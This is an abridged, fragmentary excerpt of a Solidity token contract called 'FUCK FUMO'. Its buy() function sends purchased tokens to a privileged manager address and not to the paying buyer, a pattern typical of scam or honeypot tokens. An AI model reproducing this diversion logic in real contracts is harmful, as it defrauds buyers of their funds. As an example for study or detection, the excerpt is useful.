...
contract FUCKFUMO {
    ...
    string public name = "FUCK FUMO";
    string public symbol = "FKFUMO";
    ...
    constructor(address _fumoManager) {
        owner = msg.sender;
        fumoManager = _fumoManager;
    ...
    function buy() public payable {
        ...
        if (buyFee > 0) {
            ...
            balanceOf[fumoManager] = balanceOf[fumoManager].add(amountAfterFee);
            emit Transfer(address(this), fumoManager, amountAfterFee);
            ...
            balanceOf[fumoManager] = balanceOf[fumoManager].add(amount);
            emit Transfer(address(this), fumoManager, amount);
        }
    }
    ...
    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == fumoManager,
